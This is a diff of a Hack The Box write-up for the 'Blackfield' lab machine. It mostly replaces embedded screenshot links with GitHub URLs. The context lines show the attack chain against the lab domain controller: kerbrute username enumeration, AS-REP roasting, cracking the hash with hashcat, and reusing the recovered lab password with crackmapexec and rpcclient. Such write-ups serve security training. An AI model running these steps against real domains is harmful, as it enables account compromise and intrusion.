@@ -106,7 +106,7 @@ kerbrute -h
 ./kerbrute userenum --dc 10.10.10.192 -d blackfield -o kerbrute.username.out users.lst
 ```
 
-![[Pasted image 20250109185104.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109185104.png)
 Found three valid usernames. Save these to a file.
 
 ![[Pasted image 20250109185234.png]]
@@ -120,7 +120,7 @@ Use [[Impacket]] #getnpusers to perform #ASREProast
 
 Got a hash 
 
-![[Pasted image 20250109190751.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109190751.png)
 Crack this hash with #hashcat 
 
 Figure out hashcat mode quickly:
@@ -135,7 +135,7 @@ Figure out hashcat mode quickly:
 
 Need mode `18200`
 
-![[Pasted image 20250109201559.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109201559.png)
 
 Crack the hash. 
 
@@ -143,7 +143,7 @@ Crack the hash.
 ./hashcat -m 18200 hashes/blackfield /opt/wordlist/rockyou.txt
 ```
 
-![[Pasted image 20250109201716.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109201716.png)
 
 When hashcat is done..use `--show` flag
 
@@ -151,7 +151,7 @@ When hashcat is done..use `--show` flag
 ./hashcat -m 18200 hashes/blackfield --show
 ```
 
-![[Pasted image 20250109201827.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109201827.png)
 
 Password is: `#00^Blackknight`
 
@@ -161,7 +161,8 @@ Use these new creds with #crackmapexec
 cme smb 10.10.10.192 --shares -u support -p '#00^Blackknight'
 ```
 
-![[Pasted image 20250109202117.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109202117.png)
+
 
 Trying to connect with #rpcclient again
 
@@ -169,7 +170,7 @@ Trying to connect with #rpcclient again
 rpcclient -U support 10.10.10.192
 ```
 
-![[Pasted image 20250109202457.png]]
+![](https://github.com/RachHavoc/HTB-Notes/blob/main/HackTheBox/Windows/attachments/Pasted%20image%2020250109202457.png)
 Run 
 ```
 enumdomusers
